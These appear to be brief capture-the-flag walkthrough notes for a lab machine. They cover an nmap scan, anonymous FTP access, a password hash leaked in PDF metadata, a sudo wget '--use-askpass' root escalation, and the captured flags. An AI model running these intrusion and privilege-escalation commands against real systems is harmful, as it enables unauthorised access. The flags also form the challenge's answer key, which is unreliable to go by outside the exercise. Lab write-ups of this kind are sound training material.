## IP
10.1.2.157

## scan nmap
nmap 10.1.2.157 -sCV -p- -oN scan.nmap --min-rate=1000

## ftp
ftp-anon: Anonymous FTP login allowed (FTP code 230)

## connect to ftp
>> ftp 10.1.2.157
   >> anonymous

## transfer ftp file
>> ls
>> get sienna_eborchure.pdf

## check metadata pdf
>> exiftool sienna_eborchure.pdf
-- Creator : your password is dcb76da384ae3028d6aa9b2ebcea01c9
-- pwd : dcb76da384ae3028d6aa9b2ebcea01c9
-- decrypt : sayang (md5)

## Login
find /var -type f -name "*.php"
## upload reverse shell

## privilege escalation
>> su viente
>> sayang
>> sudo -l
>> gtfobin wget

python3 -c 'import pty; pty.spawn("/bin/bash")'

TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/bash\n/bin/bash 1>&0' >$TF
sudo wget --use-askpass=$TF 0

d41d8cd98f00b204e9800998ecf8427e --user
bfa735005ec4d7637c0faf2ad0859132 --root

e952ebf409e34aee308038f555d85049
FlAg{H4h4H4_YoU_CaNt_dO_ThAt}

FlAg{e952ebf409e34aee308038f555d85049}
FlAg{bfa735005ec4d7637c0faf2ad0859132}
FlAg{d41d8cd98f00b204e9800998ecf8427e}